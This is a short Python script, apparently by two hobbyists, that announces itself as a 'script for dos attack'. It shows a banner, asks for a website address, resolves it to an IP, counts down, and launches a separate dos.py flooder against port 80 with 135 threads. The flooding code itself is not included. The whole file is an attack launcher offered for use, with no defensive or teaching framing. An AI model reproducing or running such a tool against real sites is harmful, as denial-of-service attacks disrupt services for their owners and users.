import os
import socket
import sys
import time
os.system ('clear')
g = " -p 80"
h = " -t 135"
G = "\033[0;32m"
R = "\033[0;35m"
print( R+ "   _____   _       _   _____   _____   _   _   ") 
print(G+ "  /  ___| | |     | | |_   _| /  ___| | | | | ")
print(R+ "  | |     | |     | |   | |   | |     | |_| | ")
print(G+ "  | |  _  | |     | |   | |   | |     |  _  | ")
print(R+ "  | |_| | | |___  | |   | |   | |___  | | | | ")
print(G+ "  \_____/ |_____| |_|   |_|   \_____| |_| |_|   ")
print("  ")
print(R+"   welcome in (*\033[0;32mAbdo \033[0;35m& \033[0;32mMohamed\033[0;35m*) script        ")
print("   ")
print(G+"    (^__^) \033[0;35mthise script for dos attack \033[0;32m(^__^)")
print ("    ")
print(R+"     Site link as *\033[0;32mwww.google.com\033[0;35m*")
print("     ")
p = input (R+" Please Type site link ==>\033[0;32m ")
time.sleep(2)
os.system("clear")
print("   ")
print("  The Attack Will Be Start After 5 second ")
print(" ")
time.sleep(1)
print("        1")
time.sleep(1)
print("          2")
time.sleep(1)
print("            3")
time.sleep(1)
print("              4")
time.sleep(1)
print("                5")

y=socket.gethostbyname(p)

os.system("python3 dos.py -s "+y +g +h)
